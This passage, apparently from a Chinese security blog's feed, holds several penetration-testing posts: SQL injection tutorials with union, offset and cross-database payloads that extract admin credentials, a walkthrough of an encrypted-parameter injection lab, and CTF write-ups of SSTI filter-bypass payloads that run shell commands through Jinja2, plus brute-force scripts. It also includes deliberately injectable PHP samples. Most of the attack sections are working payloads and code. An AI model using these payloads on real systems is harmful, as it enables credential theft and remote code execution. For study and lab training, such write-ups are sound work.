col_name(object_id('manage'),3) from sysobjects),null,nulland 1=2  union all select null,(select top 1 col_name(object_id('manage'),4) from sysobjects),null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取数据：and 1=2 union all select null,username, password ,null from manage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入漏洞分析(一)</title>
      <link href="/posts/5a5a.html"/>
      <url>/posts/5a5a.html</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入原理">SQL注入原理</h2><p>脚本代码在实现代码与数据库进行数据通讯时，将定义的SQL语句进行查询数据时。其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员账号密码）。</p><h2 id="危害利用分析">危害利用分析</h2><p>简单来说，就是能获取数据库中数据，以及管理员账号密码，如果是高权限注入的话，那就获取读写文件\权限跨库查询注入等，能进一步拿到服务器shell，也可以跨站渗透。</p><ul class="lvl-0"><li class="lvl-2"><p>数据库能做什么它就能做什么</p></li><li class="lvl-2"><p>sql语句查询，删除，添加，修改等操作</p></li></ul><blockquote><p>不同的数据库语句的写法规则不同，也就是必须符合正确的写法才能执行成功，取决当前的数据库语句定义，不同的数据库内置配置不一样</p></blockquote><p><strong>漏洞产生根本条件：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>可控变量</p></li><li class="lvl-2"><p>特定函数</p></li></ul><blockquote><p>大部分web漏洞的产生都离不开可控变量和特定函数这两个因素</p></blockquote><h2 id="SQL注入攻击流程">SQL注入攻击流程</h2><ol><li class="lvl-3"><p>猜测数据库类型</p></li><li class="lvl-3"><p>根据类型选择思路</p></li></ol><h3 id="数据库结构">数据库结构</h3><p>数据库名</p><p>​表名</p><p>​列名</p><p>​数据</p><h3 id="以php作简单的示例演示脚本代码与数据库操作流程">以php作简单的示例演示脚本代码与数据库操作流程</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php//操作数据库讲数据取出进行展示//$conn=mysql_connect('localhost','root','root');//mysql_select_db('beescms',$conn);include("/config/conn.php");$i=$_GET['id'];//GET请求接受id参数名值给变量i$sql="select * from bees_article where id=$i";$result=mysql_query($sql,$conn); //执行sql语句while($row=mysql_fetch_array($result)){    echo '&lt;br&gt;&lt;br&gt;&lt;hr&gt;';    echo $row['id'];    echo $row['content'];}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config目录里的conn.php文件：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$conn=mysql_connect('localhost','root','root');mysql_select_db('beescms',$conn);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>连接sql语句函数：mysql_connect()<br>选择数据库函数：mysql_select_db()<br>mysql执行函数：mysql_query()</p></blockquote><p><strong>注入点：</strong></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">如果下面的 URL 地址测试注入判断 id 有注入，手工测试该如何进行？http://192.168.255.134:84/Production/PRODUCT.asp?id=1513&amp;page=1http://192.168.255.134:84/Production/PRODUCT.asp?page=1&amp;id=1513Production/PRODUCT.asp?id=1513 注入语句&amp;page=1 对Production/PRODUCT.asp?id=1513&amp;page=1 注入语句 错注：那个参数有注入点，就要针对那个参数注入两个参数之间的位置可以互换<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ACCESS">ACCESS</h3><p>由于Access数据特性导致这个SQL注入是需要借助字典去猜解表名和列名的，那么就会出现表名或列名猜解不到，可以自定义社工字典或采用偏移注入。</p><p>偏移注入就是解决表名已知，列名未知</p><p><strong>实例：</strong></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306011314929.png" alt=""></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">列名可以叫字段order by 查字段数(当前的表的列名数量)union联合查询 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul class="lvl-0"><li class="lvl-2"><p>先有<mark>order by</mark>测试出字段（经过测试，得到22）</p></li><li class="lvl-2"><p>使用payload：</p><p><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</code></p><p>查看页面数字回显的位置以及是哪个数字</p></li><li class="lvl-2"><p>经过测试页面回显的数字是3、15</p></li></ul><p>当进行到这一步后接下来就是猜解列名，可以两种方法猜解列名：一种是字典爆破，另一种是偏移注入</p><p>偏移注入<mark>payload</mark>：</p><p><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,* from (admin a inner join admin b on a.id=b.id)</code></p><p>访问查看源代码便可以在页面得到管理员密码</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306011315234.png" alt=""></p><blockquote><p><strong>偏移注入</strong>就是解决表名已知，列名未知的情况</p></blockquote><p>如果想详细了解偏移注入，请参考这篇文章：<a href="https://www.cnblogs.com/02SWD/p/15811580.html">https://www.cnblogs.com/02SWD/p/15811580.html</a></p><h3 id="MYSQL">MYSQL</h3><p>MYSQL属于统一管理</p><p><strong>MYSQL的数据库用户关系：</strong></p><p>最高数据库用户=root 用户数据库 A=网站 A=数据库用户 A<br>表名列名数据数据库 B=网站 B=数据库用户 B<br>数据库 C=网站 C=数据库用户 C</p><blockquote><p>如果面对渗透网站A的话，通过网站B注入获取网站A的数据库数据</p></blockquote><p>为了网站和数据库的安全性，MYSQL 内置有 ROOT 最高用户，划分等级，每个用户对应管理一个数据库，这样保证无不关联，从而不会影响到其他数据库的运行。</p><p>MYSQL 两种思路：非 ROOT 的注入攻击：常规类的猜解<br>ROOT 用户的注入攻击：文件读写操作，跨库查询注入等黑盒测试中可以采用 user()获取当前用户权限，白盒中看连接用户即可！</p><p>MYSQL5.0 以上版本：自带的数据库名 information_schema<br>information_schema：存储数据库下的数据库名及表名，列名信息的数据库<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息表<br>information_schema.schemata：记录所有的数据库名</p><blockquote><p>注：group_concat()这个函数（属于MysQL函数)可以查询多个数据，通过用于页面有回显的联合注入</p></blockquote><p><strong>获取相关数据思路：</strong><br>1、数据库版本-看是否符合 information_schema 查询-version()<br>2、数据库用户-看是否符合 ROOT 型注入攻击-user()<br>3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os<br>4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()</p><p>5、查看mysql路径-@@basedir</p><p><strong>ROOT 类型攻击-猜解数据，文件读写，跨库查询</strong></p><p>以下用一个比较简单示例演示</p><p>示例的代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php//声明文件解析的编码格式header('Content-type:text/html;charset=utf-8');//操作数据库讲数据取出进行展示$conn=mysql_connect('localhost','root','root');mysql_select_db('beescms',$conn);$i=$_GET['id'];//GET请求接受id参数名值给变量i$sql="select * from bees_article where id='$i'";$result=mysql_query($sql,$conn); //执行sql语句while($row=mysql_fetch_array($result)){    echo '&lt;br&gt;&lt;br&gt;&lt;hr&gt;';    echo $row['id'];    echo $row['content'];}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注：我是随便找一个数据库来演示，如果你的本地没有<strong>beescms</strong>这个数据库的话，可以更换你本地一个已有的数据库进行测试，只不过表、列以及数据等不同而且，但思路是一样的</p></blockquote><p><strong>演示：</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#猜字段，这个比较简单?id=-1' order by 2--+ #不报错?id=-1' order by 3--+ #报错，说明字段是2#获取 beescms 数据库下面的表名信息：?id=-1' union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()--+ #得到其中一个重要的表 bees_admin#获取表名 bees_admin 的列名信息：?id=-1' union select 1,group_concat(column_name) from information_schema.columns where  table_schema=database() and table_name='bees_admin'--+ #得到admin_name和admin_password两个重要列名#获取数据：?id=-1' union select admin_name,admin_password from beescms.bees_admin--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>跨库注入：实现当前网站跨库查询其他数据库对应网站的数据</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#获取当前 mysql 下的所有数据库名?id=-1' union select 1,group_concat(schema_name) from information_schema.schemata--+#获取数据库名 xhcms 下的表名信息,这个xhcms是我本地的另一个数据库?id=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='xhcms'--+#获取数据库名 xhcms 下的表 manage 下的列名信息?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='xhcms' and table_name='manage'--+ #有显示name和password两个重要列名#获取数据?id=-1' union select name,password from xhcms.manage--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>技巧分享：concat_ws()这个函数可以将数据有一个比较好的显示，比如：</p><p>?id=-1’ union select 1,concat_ws(‘~’,name,password) from xhcms.manage–+</p><p>这样显示会更直观</p></blockquote><h2 id="一个参数是经过base64加密的示例">一个参数是经过base64加密的示例</h2><p>举个例子，假如网站的URL形式是这样的：<a href="http://www.example.com/test.php?id=MQ==">http://www.example.com/test.php?id=MQ==</a></p><p>很明显这种情况是属于参数经过base64加密的（MQ==经过base64解密后是1）</p><p>对于这种情况，在测试这个网站有没有SQL注入的方式应该是将payload进行加密后写入url测试</p><blockquote><p>之前就遇到一个比较狠的情况，它的参数是要经过base64加密的，而且数据库版本低于5.0，对于这种情况，只能使用字典爆破或sqlmap，</p></blockquote><p>下面就用墨者的一个靶场演示一下参数加密的注入过程：</p><p>靶场链接：<a href="https://www.mozhe.cn/bug/detail/110">https://www.mozhe.cn/bug/detail/110</a></p><p>打开靶场，点击一下通知，可以一个有关维护的通知，注意观察URL的参数(ZUlJOGMzSmVMMHQwZHhNN3diM056Zz09)，盲猜，应该是属于参数加密类型的，再仔细观察一下URL，访问一下==/news==目录</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306011315523.png" alt=""></p><p>果然在==/news==还有一个压缩包，下载下来，发现是一个php文件，文本内容如下：</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpheader('content-type:text/html;charset=utf-8');require_once '../config.php';//解密过程function decode($data){$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,'');mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021');$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));mcrypt_generic_deinit($td);mcrypt_module_close($td);if(substr(trim($data),-6)!=='_mozhe'){echo '&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;';}else{return substr(trim($data),0,strlen(trim($data))-6);}}$id=decode($_GET['id']);$sql="select id,title,content,time from notice where id=$id";$info=$link-&gt;query($sql);$arr=$info-&gt;fetch_assoc();?&gt;&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;X公司HR系统V1.0&lt;/title&gt;&lt;style&gt;.body{width:600px;height:500px;margin:0 auto}.title{color:red;height:60px;line-height:60px;font-size:30px;font-weight:700;margin-top:75pt;border-bottom:2px solid red;text-align:center}.content,.title{margin:0 auto;width:600px;display:block}.content{height:30px;line-height:30px;font-size:18px;margin-top:40px;text-align:left;color:#828282}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="body"&gt;&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到代码，觉得这道题最复杂的地方应该在这里了，接下来分析代码，如果你和我一样，看不太懂的话，就去网站查一下有些函数是什么意思</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">mcrypt_module_open() - 打开算法和模式对应的模块mcrypt_generic_init() - 初始化加密所需的缓冲区mdecrypt_generic () - 解密数据base64_decode() - base64解码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以先拿URL的参数<mark>ZUlJOGMzSmVMMHQwZHhNN3diM056Zz09</mark>去base64解码，得到eII8c3JeL0t0dxM7wb3Nzg==，接着就拿去AES解密，根据php代码的提示设置相关key、偏移量等信息，我这里使用一款工具进行AES加解密、base64编码解码，你也在线AES加解密、base64编码解码</p><blockquote><p>在线AES加解密：<a href="https://www.toolhelper.cn/SymmetricEncryption/AES">https://www.toolhelper.cn/SymmetricEncryption/AES</a></p><p>在线base64编码解码：<a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode</a></p></blockquote><p>对eII8c3JeL0t0dxM7wb3Nzg==进行AES解密：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306011315538.png" alt=""></p><p>再结合代码分析，这靶场思路应该是这样：先要把payload进行AES加密，再把结果经过base64编码后再进行注入，而且payload一定要带上==_mozhe==</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#获取数据库1 order by 4_mozhe #没报错1 order by 5_mozhe #报错，说明字段是4#获取显位-1 union select 1,2,3,4_mozhe#获取数据库名、数据库版本-1 union select 1,database(),version(),4_mozhe #得到数据是mozhe_Discuz_StormGroup，版本是5.7.22-0ubuntu0.16.04.1#获取数据库表-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'_mozhe #获取得到StormGroup_member,notice这两个表#获取StormGroup_member下的列名信息-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='mozhe_Discuz_StormGroup' and table_name='StormGroup_member'_mozhe #获取id,name,password,status列名#获取列名name和password数据-1 union select 1,concat_ws('~',name,password),3,4 from mozhe_Discuz_StormGroup.StormGroup_member_mozhe #得到mozhe~356f589a7df439f6f744ff19bb8092c0，注意我在测试发现这里有个坑，这个密码不是有效密码，它还有另一个密码#获取所有密码-1 union select 1,group_concat(password),3,4 from mozhe_Discuz_StormGroup.StormGroup_member_mozhe #另一个密码：36f85d327ebec8ac4b80e3133e2a0d16，md5解密后得到652987#最终确定账号密码分别为mozhe、652987<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：以上payload均需要先经过AES加密后再base64编码，再能注入</p><p><strong>如果觉得这个有一小点难理解，又体验复现参数加密注入的话，可以用下面的代码放在本地测试，注意要把数据库、及数据库表那些信息改成你本地已有的相关信息，然后进行测试，注入的思路是一样的，只是参数经过base64编码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php//声明文件解析的编码格式header('Content-type:text/html;charset=utf-8');//操作数据库讲数据取出进行展示$conn=mysql_connect('localhost','root','root');mysql_select_db('beescms',$conn);$i=$_GET['id'];//GET请求接受id参数名值给变量i$i=base64_decode($i);$sql="select * from bees_article where id='$i'";$result=mysql_query($sql,$conn); //执行sql语句while($row=mysql_fetch_array($result)){    echo '&lt;br&gt;&lt;br&gt;&lt;hr&gt;';    echo $row['id'];    echo $row['content'];}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI漏洞分析</title>
      <link href="/posts/62cc.html"/>
      <url>/posts/62cc.html</url>
      
        <content type="html"><![CDATA[<h2 id="SSTI漏洞原理">SSTI漏洞原理</h2><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><h2 id="如何判断检测SSTI漏洞的存在">如何判断检测SSTI漏洞的存在</h2><p>输入的数据会被浏览器利用当前脚本语言调用解析执行</p><h2 id="SSTI会产生在那些语言应用">SSTI会产生在那些语言应用</h2><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282225738.png" alt=""></p><h2 id="SSTI安全问题在生产环境哪里产生">SSTI安全问题在生产环境哪里产生</h2><ul class="lvl-0"><li class="lvl-2"><p>存在模板引用的地方，如404错误页面展示</p></li><li class="lvl-2"><p>存在数据接收引用的地方，如模板解析获取参数数据</p></li></ul><h2 id="CTF案例讲解">CTF案例讲解</h2><p><strong>以下是CTFSHOW靶场案例：</strong></p><h3 id="web361">web361</h3><p>题目：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282225574.png" alt=""></p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282226599.png" alt=""></p><h3 id="web362">web362</h3><p>这一关过滤了2、3等数字，os_os._wrap_close这个类没法使用，利用<mark>subprocess.Popen()</mark></p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{().__class__.__mro__[1].__subclasses__()[407]("cat /flag",shell=True,stdout=-1).communicate()[0]}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282226342.png" alt=""></p><h3 id="web363">web363</h3><p>这一关是过滤双引号，考虑使用<mark>get</mark>传参绕过</p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]}}&amp;a=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web364">web364</h3><p>这一关是过滤了<mark>args</mark>，考虑用用<mark>request.values</mark></p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{().__class__.__mro__[1].__subclasses__()[407](request.values.a,shell=True,stdout=-1).communicate()[0]}}&amp;a=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web365">web365</h3><p>这一关属于过滤方括号，可以用==<em>getitem</em>==绕过</p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)}}&amp;a=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web366">web366</h3><p>这一关过滤了下划线，换一个更简单获取<mark>popen</mark>方法的类</p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&amp;a=cat /flag&amp;b=__globals__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web367">web367</h3><p>这一关过滤了os，可以通过<mark>get</mark>来获取</p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&amp;a=__globals__&amp;b=os&amp;c=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web368">web368</h3><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">这一关过滤了request，是在{{}}中过滤了request，没有在{% %}过滤request<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&amp;a=__globals__&amp;b=os&amp;c=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web369">web369</h3><p>写一个脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsurl="http://ac6e1d67-01fa-414d-8622-ab71706a7dca.chall.ctf.show:8080/?name={{% print (config|string|list).pop({}).lower() %}}"payload="cat /flag"result=""for j in payload:    for i in range(0,1000):        r=requests.get(url=url.format(i))        location=r.text.find("&lt;h3&gt;")        word=r.text[location+4:location+5]        if word==j.lower():            print("(config|string|list).pop(%d).lower()  ==  %s"%(i,j))            result+="(config|string|list).pop(%d).lower()~"%(i)            breakprint(result[:len(result)-1])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终的payload：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">?name={% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以参考以下大佬的</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">http://ec6b99bb-953a-4e28-8962-084bda49c739.chall.ctf.show/?name={% set po=dict(po=a,p=a)|join%}{% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%}{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}{%print(x.open(file).read())%}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>下面是buuctf上面的一个靶场：</strong></p><h3 id="WesternCTF2018-shrine">[WesternCTF2018]shrine</h3><p>题目：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282226992.png" alt=""></p><p><strong>payload：</strong></p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">/shrine/{{url_for.__globals__['current_app'].config}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305282226690.png" alt=""></p><p>参考文章：<a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> CTFSHOW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-web入门-爆破</title>
      <link href="/posts/4921.html"/>
      <url>/posts/4921.html</url>
      
        <content type="html"><![CDATA[<h2 id="web21">web21</h2><p>打开题目，随便输入用户名admin和密码（密码随便）：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271357154.png" alt=""></p><p>抓包准备爆破，从数据包中可以看出输入用户名和密码是被一起，用base64解密一下，可以看得出，用户名和密码在数据包中的格式为：<mark>用户名:密码</mark>，接下来准备爆破</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271357134.png" alt=""></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271357781.png" alt=""></p><p><img src="%E7%88%86%E7%A0%B4.assets/image-20230526224228779.png" alt="image-20230526224228779"></p><p>要把URL-encode these characters的打勾去掉，因为“=”会影响base64，然后开始跑，跑出结果：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271358372.png" alt=""></p><p>把<mark>YWRtaW46c2hhcms2Mw</mark>拿去base64解密得：<mark>admin:shark63</mark>。然后拿用户名和密码去登录，就可以得到flag</p><h2 id="web22">web22</h2><p>这一关就是爆破子域名，没有什么好说的</p><h2 id="web23">web23</h2><p>根据题目：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);include('flag.php');if(isset($_GET['token'])){    $token = md5($_GET['token']);    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1)){        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){            echo $flag;        }    }}else{    highlight_file(__FILE__);}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用python或php，写payload，找出符合条件的token</p><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import hashlibdic = '0123456789qazwsxedcrfvtgbyhnujmikolp'for a in dic:  for b in dic:    t = str(a)+str(b)    md5 = hashlib.md5(t.encode('utf-8')).hexdigest()    if md5[1] != md5[14] or md5[14]!= md5[17]:        continue    if(ord(md5[1]))&gt;=48 and ord(md5[1])&lt;=57 and (ord(md5[31]))&gt;=48 and ord(md5[31])&lt;=57:           if((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])):              print(t)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">import hashlibfor i in range(1,10000):md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()if md5[1] != md5[14] or md5[14]!= md5[17]:continueif(ord(md5[1]))&gt;=48 and ord(md5[1])&lt;=57 and (ord(md5[31]))&gt;=48 and ord(md5[31])&lt;=57:if((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])):print(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php error_reporting(0);  $a="asdfghjklqwertyuiopzxcvbnm1234567890";for($i=0;$i&lt;36;$i++){    for($j=0;$j&lt;36;$j++){        $token=$a[$i].$a[$j];            $token = md5($token);         if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1)){             if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){                 echo $a[$i].$a[$j];                exit(0);            }         }     }} ?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上三个payload代码都可以跑出符合条件的token，接着拼接上token参数便可以获取flag</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305271359955.png" alt=""></p><h2 